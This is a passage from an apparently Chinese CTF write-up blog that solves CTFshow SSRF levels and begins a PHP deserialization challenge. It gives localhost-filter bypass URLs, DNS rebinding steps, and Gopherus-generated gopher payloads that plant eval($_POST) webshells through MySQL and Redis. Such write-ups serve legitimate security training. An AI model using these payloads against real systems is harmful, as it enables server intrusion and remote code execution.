class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>在前面题基础上ban了<code>localhost|127.0.0</code>，不过ip地址中的0是可以省略的：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.1</span>/flag.php<br>url=http:<span class="hljs-regexp">//</span><span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>/flag.php<br>url=http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>/flag.php<br></code></pre></td></tr></table></figure><p>还有就是可以把ip地址转换成进制数：<a href="https://tool.520101.com/wangluo/jinzhizhuanhuan/">ip转换网址</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>x7F000001/flag.php<br>url=http:<span class="hljs-regexp">//</span><span class="hljs-number">2130706433</span>/flag.php<br></code></pre></td></tr></table></figure><h3 id="CTFshow-SSRF-web353"><a href="#CTFshow-SSRF-web353" class="headerlink" title="[CTFshow SSRF]web353"></a>[CTFshow SSRF]web353</h3><p>同上</p><h3 id="CTFshow-SSRF-web354"><a href="#CTFshow-SSRF-web354" class="headerlink" title="[CTFshow SSRF]web354"></a>[CTFshow SSRF]web354</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>过滤了0和1，这里需要一个解析到<code>127.0.0.1</code>的域名：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span>safe.taobao.com/.flag.php<br></code></pre></td></tr></table></figure><h3 id="CTFshow-SSRF-web355"><a href="#CTFshow-SSRF-web355" class="headerlink" title="[CTFshow SSRF]web355"></a>[CTFshow SSRF]web355</h3><p><code>parse_url</code>解析后<code>host</code>长度要小于5：地址直接0就行。一开始想着这个<code>parse_url</code>也存在点问题，是不是可以利用。后面试了试发现不太行：没办法通过构造畸形的URL去绕过条件判断：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;http:///127.0.0.1/flag.php&quot;</span>; <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-variable">$parts</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);  <br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$parts</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//bool(false)</span><br></code></pre></td></tr></table></figure><h3 id="CTFshow-SSRF-web356"><a href="#CTFshow-SSRF-web356" class="headerlink" title="[CTFshow SSRF]web356"></a>[CTFshow SSRF]web356</h3><p>限制长度小于3，直接<code>url=http://0/flag.php</code>就行。</p><h3 id="CTFshow-SSRF-web357"><a href="#CTFshow-SSRF-web357" class="headerlink" title="[CTFshow SSRF]web357"></a>[CTFshow SSRF]web357</h3><p><a href="https://blog.csdn.net/ing_end/article">参考资料1</a></p><p><a href="https://xz.aliyun.com/t/7495">参考资料2</a></p><p>DNS Rebinding：<a href="http://ceye.io上注册个账号,dns/">http://ceye.io上注册个账号，DNS</a> Rebinding选项第二个设置成<code>127.0.0.1</code>。然后直接访问<code>http://r.xxxxxx/flag.php</code>即可。</p><p>感觉xxx前面那个<code>r.</code>是和DNS解析到第二个ip有关。</p><h3 id="CTFshow-SSRF-web358"><a href="#CTFshow-SSRF-web358" class="headerlink" title="[CTFshow SSRF]web358"></a>[CTFshow SSRF]web358</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="hljs-variable">$url</span>))&#123;<span class="hljs-comment">//限制格式：http://ctf.(写啥都行)show</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span>ctf.@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php?show<br></code></pre></td></tr></table></figure><p>有点像<code>URL_PARSE</code>解析漏洞：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;http://ctf.@127.0.0.1/flag.php?show&quot;</span>; <br><span class="hljs-variable">$parts</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);  <br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$parts</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//结果：</span><br><span class="hljs-keyword">array</span>(<span class="hljs-number">5</span>) &#123; [<span class="hljs-string">&quot;scheme&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;http&quot;</span> [<span class="hljs-string">&quot;host&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;127.0.0.1&quot;</span> [<span class="hljs-string">&quot;user&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;ctf.&quot;</span> [<span class="hljs-string">&quot;path&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;/flag.php&quot;</span> [<span class="hljs-string">&quot;query&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;show&quot;</span> &#125;<br></code></pre></td></tr></table></figure><p>但这里file_get_contents函数的参数还是那个URL。感觉正确的解释是以<code>ctf.</code>为账号去登录了<code>127.0.0.1</code>，后面接了个<code>get</code>传<code>show</code>去满足正则匹配(没给show赋值所以没啥影响)。</p><p>比如在<code>op.gg</code>前面加个<code>i@</code>:</p><p><img src="/img/tctfshowssrf.png" alt="tctfshowssrf"></p><p>之后访问的还是<code>op.gg</code></p><h3 id="CTFshow-SSRF-web359"><a href="#CTFshow-SSRF-web359" class="headerlink" title="[CTFshow SSRF]web359"></a>[CTFshow SSRF]web359</h3><p>359，360这俩题主要就是Gopherus这个工具的使用：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">python gopherus.py --exploit mysql<br><br>Give MySQL username: root<br>Give query <span class="hljs-keyword">to</span> execute: <span class="hljs-keyword">select</span> &#x27;&lt;?php eval($_POST[pass])<span class="hljs-comment">; ?&gt;&#x27; INTO OUTFILE &#x27;/var/www/html/2.php&#x27;;</span><br><br>Your gopher link is ready <span class="hljs-keyword">to</span> do SSRF :<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">gopher:</span>//<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">3306</span>/_<span class="hljs-variable">%a3</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%85</span><span class="hljs-variable">%a6</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%21</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%77</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%64</span><span class="hljs-variable">%00</span><span class="hljs-variable">%66</span><span class="hljs-variable">%03</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%6</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%05</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%75</span><span class="hljs-variable">%78</span><span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%08</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%62</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%04</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%69</span><span class="hljs-variable">%64</span><span class="hljs-variable">%05</span><span class="hljs-variable">%32</span><span class="hljs-variable">%37</span><span class="hljs-variable">%32</span><span class="hljs-variable">%35</span><span class="hljs-variable">%35</span><span class="hljs-variable">%0</span>f<span class="hljs-variable">%5</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%73</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%06</span><span class="hljs-variable">%35</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%37</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%32</span><span class="hljs-variable">%32</span><span class="hljs-variable">%09</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%66</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%06</span><span class="hljs-variable">%78</span><span class="hljs-variable">%38</span><span class="hljs-variable">%36</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%36</span><span class="hljs-variable">%34</span><span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-variable">%70</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%67</span><span class="hljs-variable">%72</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%5</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%05</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%03</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%20</span><span class="hljs-variable">%27</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%20</span><span class="hljs-variable">%65</span><span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%28</span><span class="hljs-variable">%24</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%50</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%53</span><span class="hljs-variable">%54</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%3</span>e<span class="hljs-variable">%27</span><span class="hljs-variable">%20</span><span class="hljs-variable">%49</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%54</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%20</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%55</span><span class="hljs-variable">%54</span><span class="hljs-variable">%46</span><span class="hljs-variable">%49</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%45</span><span class="hljs-variable">%20</span><span class="hljs-variable">%27</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%77</span><span class="hljs-variable">%77</span><span class="hljs-variable">%77</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%68</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%32</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%27</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><br></code></pre></td></tr></table></figure><p>注意点就是<code>_</code>后的部分需要<code>urlencode</code>一次。</p><h3 id="CTFshow-SSRF-web360"><a href="#CTFshow-SSRF-web360" class="headerlink" title="[CTFshow SSRF]web360"></a>[CTFshow SSRF]web360</h3><p>同上，gopher打redis。</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xquery">python gopherus.py --exploit redis<br><br>What do you want?? (ReverseShell/PHPShell): php<br><br>Give web<span class="hljs-built_in"> root</span> location <span class="hljs-keyword">of</span> server (<span class="hljs-keyword">default</span> <span class="hljs-literal">is</span> /var/www/html): <br>Give PHP Payload (We have <span class="hljs-keyword">default</span> PHP Shell): &lt;?php eval(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);?&gt;<br><br>gopher://<span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">6379</span>/<span class="hljs-number">_</span><span class="hljs-meta">%2A1</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%248</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0Aflushall</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%2A3</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%243</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0Aset</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%241</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A1</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%2428</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%3C</span><span class="hljs-meta">%3Fphp</span><span class="hljs-meta">%20eval</span><span class="hljs-meta">%28</span><span class="hljs-meta">%24_POST</span><span class="hljs-meta">%5B1</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%29</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%3F</span><span class="hljs-meta">%3E</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%2A4</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%246</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0Aconfig</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%243</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0Aset</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%243</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0Adir</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%2413</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span>/var/www/html<span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%2A4</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%246</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0Aconfig</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%243</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0Aset</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%2410</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0Adbfilename</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%249</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0Ashell</span>.php<span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%2A1</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%244</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0Asave</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%0A</span><br></code></pre></td></tr></table></figure><p>url再编码一次传参就行，注意默认生成的文件是<code>shell.php</code>。</p><h3 id="最后是之前没做出来的一些题，照着wp写了下："><a href="#最后是之前没做出来的一些题，照着wp写了下：" class="headerlink" title="最后是之前没做出来的一些题，照着wp写了下："></a>最后是之前没做出来的一些题，照着wp写了下：</h3><h3 id="BeginCTF-POPgadget"><a href="#BeginCTF-POPgadget" class="headerlink" title="[BeginCTF]POPgadget"></a>[BeginCTF]POPgadget</h3><p>没做出来可惜了，唉：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Fun</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;call_user_func_array&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;func,<span class="hljs-variable">$f</span>,<span class="hljs-variable">$p</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;FLAG&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;serialize me?&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/Test/&quot;</span>,<span class="hljs-title function_ invoke__">get_class</span>(<span class="hljs-variable">$this</span>-&gt;a)))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No test in Prod\n&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-variable">$p</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span 